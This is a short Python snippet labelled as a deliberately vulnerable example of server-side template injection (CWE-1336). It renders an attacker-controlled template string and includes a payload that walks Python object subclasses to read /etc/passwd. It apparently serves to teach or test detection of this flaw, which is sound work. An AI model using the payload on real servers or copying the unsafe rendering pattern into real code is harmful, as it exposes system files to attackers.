# Vulnerable: NOV-CWE-1336-01
def render_email(template_str, data):
# Compiling template directly from input
template = Template(template_str)
return template.render(data)
# Attacker controls the template string
template_input = "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}"
safe_data = {}
print(render_email(template_input, safe_data))
# This could read the server's /etc/passwd file if the subclass index maps to <open>
